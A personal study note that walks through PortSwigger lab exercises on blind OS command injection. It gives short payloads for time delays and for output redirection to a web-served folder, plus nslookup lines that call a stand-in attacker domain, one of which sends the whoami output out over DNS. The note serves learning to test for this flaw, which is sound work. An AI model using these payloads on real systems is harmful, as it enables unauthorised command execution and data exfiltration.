
# simple case
adding ; in store id
![[Pasted image 20230302190317.png]]

# Blind OS command injection with time delays

testing each paramater using payload ` ; sleep 10 #` or `& sleep 10 &`

# Blind OS command injection with output redirection
## Description 

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

`/var/www/images/`
The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output.

## Answer

getting feedback request into repeater using this payload `; whoami > /var/www/images/whoami.txt #`

![[Pasted image 20230302193438.png]]
clicking on any picture and choose open in new tab
![[Pasted image 20230302193821.png]]
changing filename pramater to the file we created
![[Pasted image 20230302193841.png]]

# Blind OS command injection with out-of-band interaction
`; nslookup kgji2ohoyw.web-attacker.com #`

<iframe width="860" height="480" src="https://www.youtube.com/embed/ocqIy3zsZgo" title="Blind OS command injection with out of band interaction (Video solution, Audio)" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

# Blind OS command injection with out-of-band data exfiltration

`; nslookup whoami.kgji2ohoyw.web-attacker.com #`







---
Tags: #OS-injection #OWASP 
Resources: 
[PortSwigger OS Injection](https://portswigger.net/web-security/os-command-injection)